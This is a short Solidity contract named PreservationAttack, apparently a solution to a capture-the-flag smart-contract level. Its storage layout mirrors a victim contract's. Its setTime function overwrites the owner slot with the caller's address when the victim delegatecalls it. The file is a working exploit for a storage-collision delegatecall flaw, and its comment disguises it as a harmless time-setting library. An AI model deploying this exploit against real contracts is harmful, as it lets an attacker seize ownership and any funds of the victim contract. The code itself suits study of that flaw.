pragma solidity ^0.4.23;

// Simple library contract to set the time
contract PreservationAttack {

    uint256 public firstSlot;
    uint256 public secondSlot;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
